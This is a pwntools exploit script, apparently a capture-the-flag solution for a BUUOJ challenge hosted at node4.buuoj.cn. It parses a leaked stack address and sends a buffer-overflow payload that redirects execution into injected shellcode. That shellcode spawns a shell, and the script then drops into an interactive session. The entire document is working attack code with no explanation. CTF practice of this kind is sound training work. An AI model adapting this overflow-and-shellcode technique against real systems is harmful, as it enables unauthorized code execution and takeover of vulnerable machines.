from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386', os='linux')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 27449 )
else:
  conn = process(sys.argv[0][:-7])
  gdb.attach(conn, 'b *0x80486d7')
  
conn.recvuntil(b'crash: ')
stack_addr = int(conn.recvuntil(b'\n')[:-1], 16)
print(f'stack: {hex(stack_addr)}')
conn.recvuntil(b'> ')

leave_ret = 0x08048601
shellcode = asm(shellcraft.sh())
payload = b'crashme\x00\x00\x00' + p32(0) * 4 
payload += p32(stack_addr - 0x1c ) +  shellcode
conn.sendline(payload)
conn.interactive()
